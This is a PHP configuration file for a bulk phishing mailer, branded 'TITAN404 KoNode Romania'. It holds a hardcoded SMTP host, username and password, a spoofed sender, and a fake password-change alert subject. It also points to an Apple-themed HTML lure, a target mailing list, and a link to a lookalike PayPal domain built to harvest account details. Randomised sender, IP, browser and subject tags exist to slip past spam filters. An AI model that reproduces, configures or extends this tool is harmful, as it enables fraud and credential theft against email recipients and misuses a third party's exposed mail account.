<?php

$regards = "

       ████████╗██╗████████╗ █████╗ ███╗   ██╗██╗  ██╗ ██████╗ ██╗  ██╗
       ╚══██╔══╝██║╚══██╔══╝██╔══██╗████╗  ██║██║  ██║██╔═████╗██║  ██║
          ██║   ██║   ██║   ███████║██╔██╗ ██║███████║██║██╔██║███████║
          ██║   ██║   ██║   ██╔══██║██║╚██╗██║╚════██║████╔╝██║╚════██║
          ██║   ██║   ██║   ██║  ██║██║ ╚████║     ██║╚██████╔╝     ██║
          ╚═╝   ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═╝ ╚═════╝      ╚═╝
                                 KoNode Romania
";

/*



    Feature :

    * Random From Mail with List in script.
    * Random From Name with List in script.
    * Random Subject with List in script.
    * Random Character.
    * Random Number.
    (+) Tag Replace Email, Tag Random Subject, etc. Use this in ur letter

     		##email## : replace the contents of the letter to show the recipient's email
     		##subject## : Using random subject
     		##frommail## : Using random From mail
     		##fromname## : Using random From name
     		##short## : Using random your URL
     		##country## : Using random country around the world
     		##date## : Using date time. (NOT RANDOM)
    		##OS## : Using random Operating Systems
    		##browser## : Using random Browsers
    		##randomip## : Using randomg IP
*/

	/*	Config smtpserver 	*/

	$smtpserver = "mail.boukouja.vot.pl";

	$smtpuser = "boukouja";

	$smtppass = "dgabx8869";

	$smtpport = "25";

	$priority = 1;

 		# code...
	/*	end 	*/



	/*		Random Fiture	*/

	$userandom = 0;
	$sleeptime = 2;		// Send time ! The best is 2 secound.

	/*	End 	*/





	$mailist = "target/test1.txt";		//	Set your mail list

	/*	End 	*/




	$fromname = "Service inc.";		// Sender Name

	$frommail = "mail@guiness.pro-linuxpl.com";		// Sender Email
	$subject = "Re: [ ALERT ] [ New Statement Update ID:##randstring##] We informed success changed password and your account data on 06.08.2018";		// Subject

	$msgfile = "letter/apple-letter.html";		// Set your letter

	$replacement = 1;	//

	/*	End 	*/


	/*	Rand url 	*/
    /* For Using Multi (Random Directlink)*/
	/* $randurl = array("http://google.com","http://bing.com");
    /* For Using single Directlink */
    $randurl = array("https://paypal.com.mahmud-it.com/Myaccount/"); // You can use just 1 link if you want !


    /*	End 	*/



    $userremoveline = 0;		//

    /* End */